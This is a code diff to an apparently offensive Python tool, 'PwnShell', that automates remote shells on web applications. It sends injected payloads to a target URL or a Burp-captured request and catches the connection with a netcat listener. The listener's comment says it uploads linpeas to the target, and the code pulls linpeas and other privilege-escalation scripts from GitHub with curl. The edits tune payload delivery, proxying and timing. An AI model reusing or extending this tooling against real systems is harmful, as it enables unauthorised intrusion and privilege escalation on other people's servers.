@@ -45,14 +45,14 @@ class PwnShell:
     def info(self):
         print('[*]LOCAL IP ADDRESS : %s' % self.ip)
         print('[*]LOCAL PORT : %s' % self.port)
-        print('[*]TARGET URL : %s' % self.domain)
+        if self.domain:
+            print('[*]TARGET URL : %s' % self.domain)
 
     ####################################################################################
     ###################################  LINUX #########################################
 
     def shell_linux(self):  # Default option
         self.info()
-        # self.login()
         self.is_valid()
         self.thread()  # leave it the last one
 
@@ -82,7 +82,7 @@ class PwnShell:
 
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
         print('\n[!]Waiting for a Connection ....\n')
-        nc = nclib.Netcat(listen=('', self.port), verbose=True)
+        nc = nclib.Netcat(listen=('', self.port))
         print('\n[*]Downloading PrivESC Scripts From Github..')
         os.system(
             'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
@@ -129,18 +129,6 @@ class PwnShell:
         if self.file:
             burp.join()
 
-    ##########################################################################################
-    #################################  CHECK IF PORT IS IN USE ##############################
-
-    def is_port_in_use(self):
-        output = os.popen('netstat -lant').read()
-        lines = output.split('\n')
-        for line in lines:
-            if str(self.port) in line:
-                if line.split()[-1] == 'ESTABLISHED':
-                    return True
-                return False
-
     ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
@@ -149,9 +137,6 @@ class PwnShell:
             for payload in payloads:
                 self.send_request(payload)
                 time.sleep(2)  # Change this ASAP !!!
-                if self.is_port_in_use():
-                    break
-                # Here we have to stop the loop after getting a shell in the second thread
 
     #########################################################################################
     ###################################  Send The Request #########################################
@@ -177,24 +162,12 @@ class PwnShell:
             else:
                 r = requests.get(url, cookies=cookies, verify=False)
 
-    #########################################################################################
-    ###################################  LOGIN   ############################################
-
-    def login(self):  # ADD a condition so that if the post data isnt provided he must provide
-        url = self.domain
-        data = self.data
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
-                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-                   "Upgrade-Insecure-Requests": "1", 'Content-Type': 'application/x-www-form-urlencoded'}
-        req = requests.post(url, headers=headers, data=data)
-
     ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
     def parse_file(self):
         payloads = PayLoads(self.ip, self.port).payloads()
         for payload in payloads:
-            proxies = {'https': 'https://127.0.0.1:8080'}
+            proxies = {'http': 'http://127.0.0.1:8080'}
             encoded_payload = self.get_url_encoded_payload(payload)
             request, post_data = burpee.parse_request(self.file)  # Don;t change
             for r in request:
@@ -212,9 +185,9 @@ class PwnShell:
             else:
                 url = url.replace("PWNME", encoded_payload)
                 print(url)
-                req = requests.get(url, headers=request, verify=False)
+                req = requests.get(url, headers=request,verify=False)
                 print(req.status_code)
-            time.sleep(5)
+            time.sleep(2)
 
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
